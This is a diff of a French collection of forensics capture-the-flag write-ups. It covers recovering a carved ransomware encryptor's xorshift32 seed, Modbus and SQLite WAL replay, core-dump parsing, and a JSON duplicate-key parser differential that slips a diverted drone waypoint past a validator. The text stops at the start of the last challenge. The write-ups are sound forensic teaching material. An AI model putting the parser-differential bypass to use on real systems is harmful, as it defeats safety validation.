+Le brief README est explicite sur les deux horloges (filesystem construit le 29 oct., enregistrements d'incident du 2 oct. — chacun vaut ce qu'il dit) et les règles d'engagement : les programmes récupérés sont des données. `lsdel` ne trouve aucun inode supprimé et le journal est une transaction vide, mais `strings` sur l'extent brute révèle la suite : une note de rançon (« Contact ref: 7F3A-RECOVERY (this is NOT a decryption key) », wallet d'affichage) et, juste à côté, un second programme complet — imports libc (`scandir`, `fwrite`, `unlink`, `utime`, `getpid`), formats de chemins (`%s/%s`, `%s.enc`, `rb`/`wb`) et le format exact du log ci-dessus. Un seul ELF (`7fELF`) à l'offset `0xa1c000` ; carvé via ses section headers (`0x3888` octets, BuildID intact), c'est l'encryptor supprimé. La chaîne `@z3uAF2` à proximité n'est que des octets de chiffré de `grid_topology.cfg.enc`, pas une clé — un leurre naturel.
+
+**2. Hypothèse — le binaire documente son propre key schedule**
+
+Le désassemblage `.text` (strippé, ~1,2 Kio — lu, jamais exécuté) est un sweep linéaire : `scandir`, saut des dotfiles, saut des non-fichiers, `fopen(rb)` → `ftell`/`fread`, chiffrement, `fopen(wb)` vers `%s.enc`, `utime` (d'où les mtimes uniformes du 2 oct.), `unlink` de l'original. Le chiffrement est un xorshift32 de manuel (shifts 13/17/5, octets little-endian, état frais par bloc de 4 octets) :
+
+```
+seed = 0xa5a5a5a5; t = time(); pid = getpid()
+if (t != pid) seed = (t ^ pid) * 0x9E3779B1   (mod 2^32)
+état conservé d'un fichier à l'autre (resauvegardé après chacun)
+```
+
+Les inconnues sont donc exactement deux : les secondes de graine `t` et l'ordre des fichiers (l'ordre scandir décide qui reçoit l'état de graine). La ligne de log écrite par le binaire lui-même donne les deux ancres : le PID `2764964` verbatim, et la minute du sweep `04:13` bornant `t` — brute-forcer les 86400 secondes du jour, et la config qui se déchiffre depuis l'état de graine doit être de l'ASCII imprimable commençant par `#`.
+
+**3. Exploitation — un jour de secondes, puis suivre la chaîne**
+
+```bash
+python3 solve/solve.py ../ghost-in-the-historian.zip
+# [*] Sweep log     : 2026-10-02 04:13 historian_enc[2764964]
+# [*] Seed time     : 2026-10-02 04:13:05+00:00 (t=1790914385) seed=0x40d8e565
+# [*] Chain order   : grid_topology.cfg.enc -> historian_cache.dat.enc
+#                     -> node_status.json.enc
+# [+] FLAG            : CSCTF{...}
+```
+
+`t = 04:13:05` (cinq secondes dans la minute loggée — exactement ce que prédit le double appel `time()`) déchiffre `grid_topology.cfg.enc` directement depuis l'état de graine vers sa config, dont `SAFETY_INTERLOCK_TOKEN=flag{...}`. Enchaîner l'état survivant (`235 o → 59 états`) déchiffre `historian_cache.dat` (CSV de pressions `04:11Z/04:12Z`) puis `node_status.json` (JSON valide, `MGA-HIST-07`, `nominal`) ; l'ordre inverse échoue l'imprimabilité, confirmant `grid → cache → node`. Mon premier sweep du jour entier avec un seuil conjoint sur 3 fichiers n'a rien trouvé — à juste titre, car seul le premier fichier dans l'ordre scandir se valide depuis la graine ; scorer le fichier grid seul touche à 235/235 imprimables au premier passage (~5 s).
+
+Script de résolution : `solve/solve.py` (voir l'annexe)
+
+#### Flag
+
+`flag{...}` (masqué)
+
+#### Ce que j'ai appris
+
+- Analyser-comme-données fonctionne : imports + rodata (`%s.enc`, `rb`/`wb`, le format de log) esquissent déjà le programme avant tout désassemblage, et le `.text` de 1,2 Kio confirme schedule de graine, chaînage, clonage de timestamps et suppression en une lecture.
+- Le PID-dans-le-log est le raccourci voulu — le binaire loggue son propre `getpid()` en `%d`, réduisant la recherche de graine à une dimension (les secondes d'un jour). Sans lui, l'espace conjoint `(t, pid)` resterait brute-forçable mais bien plus laid.
+- Le sweep à seuil conjoint qui a échoué était instructif, pas perdu : le report d'état fait qu'un seul fichier se valide depuis la graine, donc scorer par fichier avec une seconde étape de chaînage est la bonne forme — et l'ordre qui échoue l'imprimabilité est lui-même une preuve de l'ordre qui réussit.
+
+#### Outils et références
+
+- Python 3 stdlib (`struct`, `hashlib`, `zipfile`) + `debugfs` (dumps lecture seule, `lsdel`, `logdump`)
+- `strings`, `objdump -d -M intel` (triage statique/désassemblage — binaire jamais exécuté)
+- Extent flat ext4 en VMDK monolithicFlat ; xorshift32 (shifts Marsaglia 13/17/5) ; ligne syslog comme oracle de PID
+
+
+### Interlock Witness
+
+| Catégorie | Résolutions | Résolu | First blood | Indice utilisé | Résolu par | Auteur du challenge |
+|---|---|---|---|---|---|---|
+| forensics | 99 | ✅ | — | non | 0xAr3s-root | Chronos Security |
+
+#### Énoncé
+
+> While the response-cell interlock read false, a fictional grid-support station feeding an allied depot network that Operation Dawn relies on accepted maintenance writes. The controller took syntactically valid Modbus/TCP writes, and the supplied safety policy is an offline response-cell rule, not a controller feature.
+>
+> Reconstruct the accepted target writes that violate the policy and derive the incident witness. Work from the supplied files only.
+>
+> Attachment: `interlock-witness.zip`, 15,307 bytes, SHA-256: `d46d5b2b820e412db288dde2a3a3f991990622a702708cb9fc13e498d223995`
+>
+> Submit: `CSCTF{<64 lowercase hex characters>}`
+
+**Fichiers fournis :** `files/interlock-witness.zip` (non commité — actuellement dans `forensics/interlock-witness.zip`)
+
+#### En bref
+
+Rejouer hors ligne l'unique flux Modbus/TCP, suivre les trois mots d'interlock (`0x000A`/`0x000B`/`0x000C`) depuis les observations FC03 et les écritures FC16 acceptées, conserver les 16 écritures cibles (en `0x0013`/`0x0014`) émises pendant que l'interlock était faux, puis hacher `INTERLOCK-WITNESS/1\0 || PDU-requête||PDU-réponse…` en SHA-256.
+
+#### Démarche
+
+**1. Reconnaissance — vérifier le bundle et inventorier la capture**
+
+```bash
+sha256sum interlock-witness.zip
+# d46d5b2b820e412db288dde2a3a3f991990622a702708cb9fc13e498d223995  conforme
+unzip -l interlock-witness.zip
+# README.txt  interlock.pcapng  register-map.md
+# interlock-policy.md  witness-format.md  provenance.json  SHA256SUMS
+capinfos interlock.pcapng   # 512 frames, interface lo unique, tcp port 502
+tshark -r interlock.pcapng -q -z conv,tcp
+# 127.0.0.1:59818 <-> 127.0.0.1:502 uniquement
+```
+
+Les trois fichiers Markdown forment toute la spécification — aucun indice caché ailleurs :
+
+- `register-map.md` : adresses **PDU** base zéro. `40011/40012/40013/40020/40021` ne sont que des étiquettes opérateur. Mots mappés : `0x000A` `maintenance_permit`, `0x000B` `isolation_state`, `0x000C` `protection_armed`, `0x0013` `trip_limit`, `0x0014` `restore_delay`.
+- `interlock-policy.md` : la règle hors ligne d'acceptation + de sécurité (ci-dessous).
+- `witness-format.md` : la sérialisation et le hash, plus un vecteur de vérification hors incident.
+
+Le framing des payloads TCP par la longueur MBAP donne **504 ADU Modbus = 252 transactions** (TID 1–252, strictement séquentiels, aucune retransmission, aucun ADU scindé/fusionné) : 124 paires FC03 et 128 paires FC16, toutes en protocole `0x0000` et unité `0x01`. Chaque réponse FC03 porte un byte count `22 = 2 × 11`, et chaque réponse normale FC16 répète adresse de départ + quantité — les filtres d'acceptation ci-dessous rejettent donc **0** transaction dans cette capture. Il fallait le vérifier, pas le supposer : c'est ce qui rend les 128 FC16 « acceptés ».
+
+**2. Hypothèse — une machine à états hors ligne, pas une chasse aux chaînes**
+
+Le flag est un SHA-256 : impossible à carver depuis la capture. Il faut le recalculer en rejouant, dans l'ordre des réponses normales :
+
+1. **FC03 accepté** seulement si la requête FC03 immédiatement précédente correspond en TID/proto/unité/fonction dans le flux renversé et `byte_count == 2 × quantity`. Il met alors à jour chaque mot mappé qu'il couvre. Ici chaque FC03 lit `0x000A` quantité 11, soit `0x000A…0x0014` : chaque observation acceptée rafraîchit donc les cinq mots mappés d'un coup.
+2. **FC16 accepté** seulement si sa réponse normale correspond en TID/proto/unité/fonction et répète adresse de départ + quantité. Les exceptions ne changent jamais l'état. Une écriture acceptée s'applique **après** sa réponse normale.
+3. **Cible** = FC16 accepté de quantité 1 en `0x0013` ou `0x0014`. La politique annonce 8 autres FC16 acceptés inéligibles ; la capture contient bien exactement 5 écritures de prérequis (`0x000C=1` TID 2, `0x000A=1` TID 19, `0x000B=1` TID 20, `0x000B=0` TID 125, `0x000B=1` TID 142) et 3 écritures d'acquittement (`0x0018/0x0019/0x001A`, TID 248/250/252), soit 120 cibles (60 par adresse).
+4. **Unsafe** = au moins l'une des conditions `permit==1`, `isolation==1`, `protection==1` est fausse **immédiatement avant la réponse normale de la cible** (une écriture ne se juge donc jamais elle-même, et une écriture de prérequis ne compte qu'à partir de la transaction suivante).
+
+Deux pièges en découlent directement : utiliser les références affichées `400xx` au lieu des adresses PDU ne trouve rien, et juger la sécurité depuis la valeur écrite par la cible — ou après l'application de sa réponse — fausse les transactions frontières.
+
+Chronologie d'état issue du rejeu (le triplet de prérequis ne change qu'à ces points) :
+
+| Après TID | permit | isolation | protection | Cause |
+|---|---|---|---|---|
+| 1 (FC03) | 0 | 0 | 1 | observation initiale |
+| 21 (FC03) | 1 | 1 | 1 | TID 19+20 arment permit/isolation |
+| 126 (FC03) | 1 | 0 | 1 | TID 125 a relâché l'isolation |
+| 143 (FC03) | 1 | 1 | 1 | TID 142 a restauré l'isolation |
+
+**3. Exploitation — sélectionner les cibles unsafe et hacher le témoin**
+
+L'application de la règle donne **16 cibles unsafe** sur 120 : TID **4, 6, 8, 10, 12, 14, 16, 18** (interlock pas encore établi, `0,0,1`) et TID **127, 129, 131, 133, 135, 137, 139, 141** (isolation relâchée, `1,0,1`). Les 104 autres cibles voient `1,1,1` et sont sûres.
+
+Pour chaque cible unsafe, dans l'ordre des réponses normales, concaténer le PDU requête (`function-code || function-data`, **sans MBAP**) puis le PDU réponse normale : `T` fait `16 × (8 + 5) = 208` octets. Avec `P = "INTERLOCK-WITNESS/1" || 0x00` (20 octets), `W = SHA-256(P || T)`.
+
+Le solveur n'utilise que la stdlib (son propre framing pcapng/Ethernet/IPv4/TCP/Modbus) et vérifie d'abord le vecteur publié — requête `10 00 13 00 01 02 00 2a` + réponse `10 00 13 00 01` → `b6e58fa9…f34786` — avant de toucher à la capture de l'incident :
+
+```bash
+python3 solve/solve.py ../interlock-witness.zip
+# [*] Vector OK    : b6e58fa962e382b112eb596e416d5680495fc4bd02141f2389797f194df34786
+# [*] Modbus ADUs  : 504
+# [*] FC03 accepted: 124 (rejected 0)
+# [*] FC16 accepted: 128 (rejected 0), targets 120
+# [*] Unsafe targets: 16 (normal-response order)
+#     TID   4 permit=0 isolation=0 protection=1 req=100013000102040d resp=1000130001
+#     ...
+#     TID 141 permit=1 isolation=0 protection=1 req=1000140001020a9a resp=1000140001
+# [*] T (208 bytes): 100013000102040d1000130001...
+# [+] FLAG         : CSCTF{...}
+```
+
+Script de résolution : `solve/solve.py` (voir l'annexe)
+
+#### Flag
+
+`flag{...}` (masqué)
+
+#### Ce que j'ai appris
+
+- Lire les trois fichiers de spec comme un seul contrat avant d'ouvrir Wireshark : acceptation, éligibilité cible, instant de sécurité et sérialisation sont quatre filtres distincts, et chacun change le hash.
+- « Immédiatement avant sa réponse normale » + « s'applique après sa réponse normale » constituent tout le modèle temporel. Évaluer à la requête coïncide ici uniquement parce que requêtes et réponses sont strictement séquentielles — le rejeu en ordre de réponse est l'implémentation sûre.
+- Une capture synthétique propre exige quand même les contrôles de rejet : vérifier 124/124 FC03 et 128/128 FC16 acceptés (et la continuité des séquences TCP, sans retransmission) justifie de traiter chaque cible FC16 comme dans le périmètre.
+- Les étiquettes `400xx` sont le piège d'adressage délibéré : tout le filtrage doit utiliser les adresses PDU base zéro (`0x000A…0x0014`).
+
+#### Outils et références
+
+- Python 3 stdlib (`struct`, `hashlib`, `zipfile`) — le solveur n'exige aucun package tiers
+- Wireshark / `tshark`, `capinfos` (contre-vérifications de reconnaissance seulement)
+- Layouts MBAP Modbus/TCP + PDU FC03/FC16 (0x10) ; format de blocs pcapng
+
+
 ### Last Buffer
 
-| Catégorie | Points | Résolutions | Résolu | First blood | Résolu par | Auteur du challenge |
+| Catégorie | Résolutions | Résolu | First blood | Indice utilisé | Résolu par | Auteur du challenge |
 |---|---|---|---|---|---|---|
-| forensics | 120 | 119 | ✅ | — | 0xAr3s-root | Chronos Security |
+| forensics | 119 | ✅ | — | non | 0xAr3s-root | Chronos Security |
 
 #### Énoncé
 
@@ -1768,11 +1382,87 @@ Script de résolution : `solve/solve.py` (voir l'annexe)
 - Format de fichier swap Vim (bloc 0 `b0`, blocs de données `0x6461`), RFC 4648 base64url
 
 
+### Last Commit
+
+| Catégorie | Résolutions | Résolu | First blood | Indice utilisé | Résolu par | Auteur du challenge |
+|---|---|---|---|---|---|---|
+| forensics | 118 | ✅ | — | non | 0xAr3s-root | Chronos Security |
+
+#### Énoncé
+
+> The national land registry of one of Operation Dawn's smaller coalition states looks normal again, but its completed restoration export `LR-731` may have carried altered ownership out to regional offices. A later clean view does not prove what the job delivered.
+>
+> Reconstruct the exact ownership export at the job's transition to `COMPLETED`, using the acquired SQLite database and WAL pair, the delivery receipt and the supplied export profile. The registry is fictional. Analyze the supplied files only. Attachment: `last-commit.zip`, 84,979 bytes, SHA-256 `06da868e7ceeef1c96651cf1307033f7b37b65e235f8a121ea599166f85279a1`.
+>
+> Submit `CSCTF{last_commit_<64 lowercase hex characters>}` as specified in the supplied export profile.
+>
+> Flag format: `CSCTF{...}`
+
+**Fichiers fournis :** `files/registry.sqlite`, `files/registry.sqlite-wal`, `files/delivery.csv`, `files/export-profile.md`, `files/provenance.json`, `files/README.txt`, `files/SHA256SUMS` (non commités).
+
+#### En bref
+
+Le WAL contient 9 frames valides en 6 commits ; le commit où `LR-731` passe de `QUEUED` à `COMPLETED` montre des lignes de propriété altérées que les commits suivants (et la base checkpointée) n'ont plus. Reconstruire le registre à ce commit, exécuter la requête du profil avec `delivery.csv` comme manifeste et hacher le TSV en SHA-256 donne le flag.
+
+#### Démarche
+
+**1. Reconnaissance — lire le contrat, pas seulement les données**
+
+`export-profile.md` est la vraie spécification : le worker lance une transaction IMMEDIATE qui interroge les parcelles du manifeste, prépare l'export, passe `export_job` de `QUEUED` à `COMPLETED` et commit. L'export est la requête exacte du profil sur l'état du registre **à ce commit** (pas une vue ultérieure), avec le reçu `delivery.csv` comme `manifest` (douze parcelles, ordre de livraison), un TSV à en-tête fixe, fins de ligne LF, haché en SHA-256. La base fait 9 pages (4096 o), le WAL 32 + 9 × (24 + 4096) = 37 112 octets, donc 9 frames. Le README interdit d'ouvrir les originaux avec SQLite (cela créerait un `-shm` et pourrait checkpointer) ; je n'ai donc jamais ouvert les originaux : tout est parsé à la main et reconstruit dans des copies temporaires. `SHA256SUMS` correspond pour tous les fichiers.
+
+**2. Hypothèse — une vue « au commit N » = base + les frames jusqu'au N-ième commit**
+
+D'après le format WAL de SQLite : en-tête `0x377f0682`, taille de page 4096, sels ; chaque frame a un en-tête de 24 octets (numéro de page, **taille de la base après commit** — non nulle seulement sur une frame de commit —, sels, checksum cumulatif) suivi de l'image de la page. Un lecteur au commit N voit, pour chaque page, la dernière frame ≤ N, et la base pour les autres pages. J'ai donc :
+
+1. validé le checksum de l'en-tête et, pour chaque frame, les sels et le checksum cumulatif (l'ordre des octets des mots dépend du magic) : les 9 frames sont valides ;
+2. listé les commits : frames 0, 2, 4, 5, 7, 8 — une transaction peut couvrir plusieurs frames (ex. frames 1+2, 3+4, 6+7), donc un état ne doit être construit qu'à une frame de commit, jamais au milieu d'une transaction ;
+3. construit une image de base simple pour chaque commit (base + frames ≤ N, plus de WAL) et interrogé `export_job`.
+
+**3. Exploitation — le commit de transition contient les lignes altérées**
+
+| Frame de commit | `LR-731` | SHA-256 de l'export (premiers octets) |
+|---|---|---|
+| base | pas de ligne | — |
+| 0 | pas de ligne | `04a47a…` |
+| 2 | pas de ligne | `40f3b1…` |
+| 4 | `QUEUED` | `40f3b1…` |
+| **5** | **`COMPLETED`** | **`40f3b1…`** |
+| 7 | `COMPLETED` | `04a47a…` |
+| 8 | `COMPLETED` | `04a47a…` |
+
+La propriété des parcelles 1202, 1205, 1209 et 1214 est altérée entre les commits 0 et 2 (nouveaux titulaires `2127`–`2131`, nouveaux instruments `IN-9360472185`, `IN-8162094735`, `IN-7259841360`, `IN-6941538207`, et un partage 65/35 au lieu de 60/40 sur la parcelle 1209), toujours présente quand le job se termine à la frame 5, puis rétablie aux titulaires d'origine dans les derniers commits : c'est la « vue propre ultérieure » dont parle l'énoncé. L'export à la transition a 13 lignes (la parcelle 1209 a deux titulaires). L'ordre des parcelles vient de `delivery.csv`, celui des titulaires de `registry_ref COLLATE BINARY`.
+
+```bash
+python3 -I solve/solve.py files
+```
+
+Le script fait tout cela (parsing du WAL, validation des checksums, état par commit, requête, hash) et affiche le flag ; il ne lit que les originaux et écrit dans un répertoire temporaire.
+
+Script de résolution : `solve/solve.py` (voir l'annexe)
+
+#### Flag
+
+`CSCTF{last_commit_<64 hex>}` (masqué)
+
+#### Réflexions
+
+- « L'état courant » et « l'état à la transaction X » sont deux choses différentes : en mode WAL, la réponse est dans la séquence de frames, pas dans ce que renvoie une ouverture normale avec `sqlite3`.
+- Seules les frames de commit (taille de base non nulle) sont des états cohérents ; une transaction peut couvrir plusieurs frames, donc s'arrêter sur une frame quelconque donne une vue incohérente.
+- Le checksum cumulatif et les sels délimitent l'époque valide ; les valider évite d'utiliser des restes de générations WAL précédentes.
+- Le même hash apparaît aux commits 2, 4 et 5 et un autre aux commits 0, 7, 8 : comparer les hashes sur tous les commits montre quand l'altération a commencé et fini, pas seulement l'état livré.
+- La preuve a été préservée : aucune ouverture SQLite des originaux, travail sur des copies reconstruites.
+
+#### Outils & références
+
+- Python 3 (`struct`, `sqlite3` sur copies reconstruites uniquement, `hashlib`, `csv`)
+- Format de fichier et format WAL de SQLite (<https://sqlite.org/fileformat2.html>, <https://sqlite.org/walformat.html>)
+
+
 ### Night Clerk
 
-| Catégorie | Points | Résolutions | Résolu | First blood | Résolu par | Auteur du challenge |
+| Catégorie | Résolutions | Résolu | First blood | Indice utilisé | Résolu par | Auteur du challenge |
 |---|---|---|---|---|---|---|
-| forensics | 120 | 45 | ✅ | — | 0xAr3s-root | Mohamed Amine Mzoughi |
+| forensics | 45 | ✅ | — | non | 0xAr3s-root | Mohamed Amine Mzoughi |
 
 #### Énoncé
 
@@ -1873,11 +1563,112 @@ Script de résolution : `solve/solve.py` (voir l'annexe)
 - Spécification OOXML tracked changes (ECMA-376)
 
 
+### Operation Dawn: Relay Snapshot
+
+| Catégorie | Résolutions | Résolu | First blood | Indice utilisé | Résolu par | Auteur du challenge |
+|---|---|---|---|---|---|---|
+| forensics | 42 | ✅ | — | non | 0xAr3s-root | Terminal43 |
+
+#### Énoncé
+
+> Une intrusion hostile a mis hors service le relais militaire d'un pays fictif, et les
+> intervenants ont capturé la mémoire du processus du relais pendant qu'ils récupéraient
+> un ordre de commandement.
+>
+> Récupérez l'ordre complet `CSCTF{...}` depuis `relay.core`. Ce cas construit contient
+> des enregistrements de relais inventés dans un vrai snapshot de processus Linux.
+> Pièce jointe : `relay.core`, core ELF Linux x86-64, 586 928 octets,
+> SHA-256 `b3e606bfbe727f0346be4cde683a9a8efd2680930219113a5b779a3c9a5121ac`.
+
+**Fichiers fournis :** `files/relay.core` (non commité)
+
+#### En bref
+
+Le tas du processus contient une liste chaînée simple de nœuds-fragments de chaînes ;
+la chaîne enracinée au nœud `CSCTF` reconstitue le flag. Des chaînes leurres ont été
+injectées pour perturber l'analyse.
+
+#### Démarche
+
+**1. Reconnaissance initiale**
+
+```bash
+file relay.core    # ELF 64-bit core, x86-64
+strings relay.core | grep CSCTF
+```
+
+`strings` révèle les fragments dispersés en mémoire, dans le mauvais ordre. Ils sont des
+objets du tas qui doivent être parcourus via des pointeurs.
+
+**2. Compréhension de la structure de données**
+
+En parsant les segments PT_LOAD du fichier ELF et en cherchant les objets commençant par
+`uint64 = 0x31` :
+
+```
+struct Container {
+    uint64_t type;   // toujours 0x31
+    struct Node {
+        struct Node *next;   // VA du nœud suivant, 0 = fin de liste
+        uint32_t     len;
+        char         data[]; // rembourré de zéros
+    } node;
+};
+```
+
+Le membre `node` commence 8 octets après le début du container :
+`node_va = container_va + 8`. Le champ `next` est la VA du **prochain nœud**
+(= `next_container_va + 8`).
+
+23 containers sont trouvés, chacun portant un fragment de chaîne.
+
+**3. Reconstruction des chaînes**
+
+On construit un graphe `node_va → (next_va, chaîne)`, puis on trouve les têtes de chaînes
+(nœuds vers lesquels aucun autre nœud ne pointe) → 10 chaînes. L'une d'elles commence
+au nœud `CSCTF` :
+
+```
+CSCTF → {20_ → dock → _mov → e_orc → hard_ → elm_ → grove → _dus → k_866 → 59c}
+```
+
+Les autres chaînes sont des leurres (trafic forgé dans le scénario).
+
+```bash
+python3 solve/solve.py files/relay.core
+```
+
+```
+[+] FLAG chain at 0x55a7aff173c0: flag{...}
+```
+
+Script de résolution : `solve/solve.py` (voir l'annexe)
+
+#### Flag
+
+`flag{...}`
+
+#### Ce que j'ai appris
+
+- `strings` révèle immédiatement les fragments, mais dans l'ordre de traversée du tas,
+  pas dans l'ordre logique.
+- Insight clé : les chaînes sont stockées dans une **liste chaînée simple**, pas
+  contiguëment.
+- Le challenge plante plusieurs chaînes leurres ; la bonne démarre au nœud `CSCTF`.
+- Un parsing ELF en Python pur (sans pwntools, sans gdb) est suffisant.
+
+#### Outils et références
+
+- `file`, `strings` (binutils)
+- Python 3 (`struct`)
+- Spécification ELF (System V ABI, supplément x86-64)
+
+
 ### Operation Dawn: The Burnt Server
 
-| Catégorie | Points | Résolutions | Résolu | First blood | Résolu par | Auteur du challenge |
+| Catégorie | Résolutions | Résolu | First blood | Indice utilisé | Résolu par | Auteur du challenge |
 |---|---|---|---|---|---|---|
-| forensics | 120 | 61 | ✅ | — | 0xAr3s-root | Terminal43 |
+| forensics | 61 | ✅ | — | non | 0xAr3s-root | Terminal43 |
 
 #### Énoncé
 
@@ -1984,9 +1775,9 @@ MOVEMENT ORDER: flag{...}
 
 ### Operation Dawn: The Relay Tap
 
-| Catégorie | Points | Résolutions | Résolu | First blood | Résolu par | Auteur du challenge |
+| Catégorie | Résolutions | Résolu | First blood | Indice utilisé | Résolu par | Auteur du challenge |
 |---|---|---|---|---|---|---|
-| forensics | 120 | 36 | ✅ | — | 0xAr3s-root | Terminal43 |
+| forensics | 36 | ✅ | — | non | 0xAr3s-root | Terminal43 |
 
 #### Énoncé
 
@@ -2094,11 +1885,159 @@ Script de résolution : `solve/solve.py` (voir l'annexe)
 - [RFC 5737](https://datatracker.ietf.org/doc/html/rfc5737) — plages d'adresses de documentation utilisées comme hôtes fictifs
 
 
+### Phantom Drift
+
+| Catégorie | Résolutions | Résolu | First blood | Indice utilisé | Résolu par | Auteur du challenge |
+|---|---|---|---|---|---|---|
+| forensics | 124 | ✅ | — | non | 0xAr3s-root | Dragoş Bacitea |
+
+#### Énoncé
+
+> Reconnaissance drone Valkyrie-9 drifted off its approved waypoint while the command server recorded the mission as nominal. Reconcile the recovered client and backend logic with the flight record, telemetry, and radio intercept to show how the diversion avoided the alarm.
+>
+> This is a constructed offline forensic case.
+>
+> Attachments: `drone_control.decompiled`, `command_backend.decompiled`, `flight_log.bin`, `mission_manifest.json`, `radio_intercept.log`, `telemetry_logs.json`.
+>
+> Flag format: `CSCTF{16_lowercase_hex}`
+>
+> Flag construction: SHA-256 the concatenated text `<APPROVED_LAT_4DP><APPROVED_LON_4DP><LAT_OFFSET_6DP><LON_OFFSET_6DP><DISTANCE_1DP>` with no separators, then use the first 16 lowercase hex characters. The flight-log tag verifies the last 8 characters of the same digest; it is not an input.
+>
+> Flag derivation: `sha256(f"{approved_lat:.4f}{approved_lon:.4f}{delta_lat:.6f}{delta_lon:.6f}{displacement_m:.1f}")[:16]`. `approved_*` = manifest coordinates; `delta_*` = per-axis delta between approved and diverted coordinates, 6 decimals (degrees); `displacement_m` = great-circle distance in meters between approved and diverted points, 1 decimal. The `TAG:` value in `flight_log.bin` matches the last 8 hex of the same sha256.
+
+**Fichiers fournis :** les six fichiers ci-dessus (non commités).
+
+#### En bref
+
+La commande `waypoint_update` contient chaque champ deux fois, en snake_case (l'approuvé 47.2591, 19.0402) et en PascalCase (le détourné 47.2600, 19.0450) ; le backend a validé une graphie et le drone a obéi à l'autre. Le détournement est de 0,000900° / 0,004800° = 376,2 m (rayon WGS84), et le tag du journal de vol sélectionne ce rayon et confirme le condensat → flag.
+
+#### Démarche
+
+**1. Reconnaissance — les deux `.decompiled` sont du code source en base64, le reste est de la preuve**
+
+`drone_control.decompiled` (C#, Unity, Newtonsoft.Json) et `command_backend.decompiled` (Go 1.21) sont un en-tête plus un `DECODED_CONTENT = "<base64>"` ; le décoder donne les sources (lues seulement, rien d'exécuté). Les deux définissent le même `FlightParams` avec les tags JSON `altitude`, `speed`, `waypoint_lat`, `waypoint_lon`, `payload_weight`, `wind_compensation`, et le même validateur : rejet si `|lat − approuvé| > 0,001` ou `|lon − approuvé| > 0,001` (environ 111 m), contre le manifeste codé en dur 47.2591, 19.0402 (mêmes valeurs que `mission_manifest.json`).
+
+Le log radio raconte l'histoire : à 12:30 la station sol 3 voit le drone 380 m à l'est de WP-Bravo, le contrôleur du drone dit que le waypoint a été mis à jour à 47.2600, 19.0450, et le serveur de commande répond « mission nominale, aucune anomalie ». La validation est donc passée pour une commande que le drone a exécutée autrement. (Je traite le « ~47.2600, 19.0450 » de la radio comme une piste et je le confirme dans la télémétrie, pas comme la réponse.)
+
+**2. Hypothèse — une charge utile, deux lectures**
+
+Dans `telemetry_logs.json`, l'enregistrement `waypoint_update` est la commande réelle. Il contient chaque champ deux fois :
+
+```json
+"waypoint_lat": 47.2591, "waypoint_lon": 19.0402, ...
+"WaypointLat": 47.26,    "WaypointLon": 19.045,   ...
+```
+
+Des clés dupliquées/aliasées sont la différentielle de parseurs classique : deux parseurs qui normalisent les noms de clés différemment (casse, underscores, dernier gagnant, correspondance insensible à la casse) voient des valeurs différentes dans les mêmes octets. Ici les valeurs approuvées sont sous la graphie que le validateur accepte (47.2591 → delta 0 → « PASS »), alors que les valeurs détournées (47.2600, 19.0450) sont sous l'autre graphie. Le reste des preuves confirme laquelle le drone a suivie : les fixes GPS de `transit_to_new_waypoint` passent de (47.2591, 19.0402) par (47.26, 19.045) et continuent de dériver vers le NE (47.2627, 19.0594), `waypoints_visited` liste `surveillance_target` à 47.26, 19.045, et `server_validation` dit PASS avec `discrepancy_detected: false` alors que `anomalies_detected` est vide. (Je n'ai exécuté aucun des deux parseurs ; le comportement exact de la bibliothèque n'est pas nécessaire pour le flag, et la note du serveur dans la télémétrie se trompe même sur la valeur lue par Go, donc je m'appuie sur les positions de télémétrie et la radio.)
+
+**3. Exploitation — calculer le flag, laisser le tag choisir le rayon terrestre**
+
+- `delta_lat = 47.2600 − 47.2591 = 0.000900`, `delta_lon = 19.0450 − 19.0402 = 0.004800` (positifs : détourné moins approuvé) ;
+- `displacement_m` par haversine. L'énoncé ne précise pas le rayon terrestre : avec le rayon moyen 6 371 000 m la distance est de 375,8 m ; avec le rayon équatorial WGS84 6 378 137 m elle est de **376,2 m** ;
+- `flight_log.bin` est un en-tête de 24 octets (`FLGT`, version, compteurs) suivi de 12 octets qui sont `TAG:xxxxxxxx` XORés avec l'identifiant de mission `Valkyrie-9` comme clé répétée (trouvée avec le clair connu `TAG:` → clé `Valk…`) : le tag est `dc6836a2`.
+
+Seule la variante 376,2 m donne un SHA-256 dont les 8 derniers caractères hexa sont `dc6836a2` ; celle à 375,8 m finit par `2126c52e`, et les variantes à deltas négatifs ne correspondent pas non plus. Le tag valide donc à la fois le rayon et la convention de signe, et les 16 premiers caractères hexa de ce condensat sont le flag.
+
+```bash
+python3 -I solve/solve.py files
+```
+
+Script de résolution : `solve/solve.py` (voir l'annexe)
+
+#### Flag
+
+`CSCTF{...}` (masqué)
+
+#### Réflexions
+
+- Deux composants qui « parsent le même JSON » ne lisent pas forcément la même valeur : des alias de clés (variantes de casse, doublons) suffisent à faire diverger un validateur et un exécutant, et un contrôle de signature ou de tolérance sur une lecture ne dit rien de l'autre.
+- Lire toute la chaîne de preuves : la trace GPS de télémétrie, le résumé des waypoints visités et le log radio s'accordent sur le point détourné, ce dont le flag a besoin ; le « PASS » du serveur n'est que la vue du validateur.
+- Le tag de vérification du journal de vol n'est pas qu'un contrôle : avec une formule sous-spécifiée (rayon terrestre, signe du delta), c'est l'oracle qui sélectionne la bonne variante.
+- Le clair connu (`TAG:`) a trouvé la clé XOR sans rien deviner sur sa longueur.
+
+#### Outils & références
+
+- Python 3 (`json`, `base64`, `math`, `hashlib`)
+- Différentielles de parseurs / problèmes d'interopérabilité JSON, distance haversine, rayon équatorial WGS84
+
+
+### Polyglot Requiem
+
+| Catégorie | Résolutions | Résolu | First blood | Indice utilisé | Résolu par | Auteur du challenge |
+|---|---|---|---|---|---|---|
+| forensics | 108 | ✅ | — | non | 0xAr3s-root | Mohamed Amine Mzoughi |
+
+#### Énoncé
+
+> A review of a ground-station software supply chain turned up altered build history and an odd dashboard asset. The station works for the Operation Dawn coalition, which puts its builds high on the Ash Army's target list.
+>
+> Recover the concealed marker from the retained repository and submit the complete `CSCTF{...}` value. Inspect build scripts, hooks and recovered programs as data: do not run them, and do not contact addresses found in the evidence. The exercise is constructed and the organizations are fictional. Attachment: `polyglot-requiem.zip`, 39,051 bytes, SHA-256 `2a3aeda4fcc7fab03a268130a22b31b2194ed45f74981146ae765d78c97813c9`.
+>
+> Flag format: `CSCTF{...}`
+
+**Fichiers fournis :** `files/flight-telemetry-sdk/` (un dépôt git avec son `.git`), `files/README_FOR_RESPONDERS.md`, `files/manifest.sha256` (non commités).
+
+#### En bref
+
